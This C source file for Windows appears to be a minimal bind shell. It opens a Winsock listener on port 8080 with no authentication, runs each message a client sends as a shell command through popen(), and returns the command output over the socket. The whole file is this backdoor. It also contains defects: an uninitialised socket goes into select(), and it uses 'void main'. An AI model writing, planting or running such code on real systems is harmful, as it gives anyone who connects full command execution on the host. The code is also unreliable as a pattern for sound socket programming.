#include <stdio.h>
#include <winsock2.h>
#include <stdlib.h>

void main(int argc, char *argv[]) {

    WSADATA winsock;
    SOCKET inbound, outbound;
    struct sockaddr_in server, address;
    int max_clients = 30, activity, addrlen, i, valread;
    char *message = "welcome\r\n";
    int MAXRECV = 1024;
    fd_set socket_desc;
    char *buffer;
    buffer = (char*) malloc((MAXRECV + 1) * sizeof(char));

    WSAStartup(MAKEWORD(2, 2), &winsock);

    inbound = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(8080);

    bind(inbound ,(struct sockaddr *)&server, sizeof(server));
    listen(inbound, 3);

    addrlen = sizeof(struct sockaddr_in);

    while (TRUE) {

        FD_ZERO(&socket_desc);

        FD_SET(inbound, &socket_desc);
        FD_SET(outbound, &socket_desc);

        activity = select(0, &socket_desc, NULL, NULL, NULL);

        if(FD_ISSET(inbound, &socket_desc)) {
            outbound = accept(inbound, (struct sockaddr *)&address, (int *)&addrlen);
            send(outbound, message, strlen(message), 0);
        }

            if (FD_ISSET(outbound, &socket_desc)) 
            {
                valread = recv(outbound, buffer, MAXRECV, 0);
                 
                if( valread == SOCKET_ERROR)
                {
                    int error_code = WSAGetLastError();
                    if(error_code == WSAECONNRESET)
                    {
                        closesocket(outbound);
                    }
                }

                if ( valread == 0)
                {
                    closesocket(outbound);
                }
                else
                {
                    buffer[valread] = '\0';
                    printf("%s:%d - %s\n" , inet_ntoa(address.sin_addr) , ntohs(address.sin_port), buffer);
               //     send(outbound, "asdasdddddddddddddddddddddd", valread, 0);
                    
                //    if (strcmp(buffer, "test") == 0) {
                //        
                //    }
                    FILE *fp;
                    char command[1024];

                    fp = popen(buffer, "r");
                    
                    printf("%s:%d - %s\n" , inet_ntoa(address.sin_addr) , ntohs(address.sin_port), buffer);

                    while (fgets(command, sizeof(command), fp) != NULL) {
                       //   printf("%s", command);
                          send(outbound, command, strlen(command) + 1, 0);
                    }
                    pclose(fp);
                    
                }
            }    
    }
    closesocket(outbound);
    WSACleanup();
}

